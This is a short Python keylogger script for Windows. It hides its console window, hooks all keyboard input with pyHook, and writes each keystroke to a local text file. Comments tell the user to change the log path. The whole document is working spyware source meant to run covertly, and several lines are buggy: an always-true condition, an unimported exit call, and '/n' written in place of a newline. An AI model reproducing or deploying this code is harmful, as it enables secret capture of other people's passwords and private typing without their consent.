import pyHook
import pythoncom
import win32console
import win32gui

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeyboardEvent(event):
    if event.Ascii == 5:
        _exit(1)
    if event.Ascii != 0 or 8:
        #change path to the .txt file where you want to have the keystrokes
        f = open('c:/keystrokes/logges.txt', 'r+')

        buffer = f.read()

        f.close()
        #change path to the .txt file where you want to have the keystrokes

        f = open('c:/keystrokes/logges.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
        buffer += keylogs
        f.write(buffer)
        f.close()



hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent

hm.HookKeyboard()

pythoncom.PumpMessages()
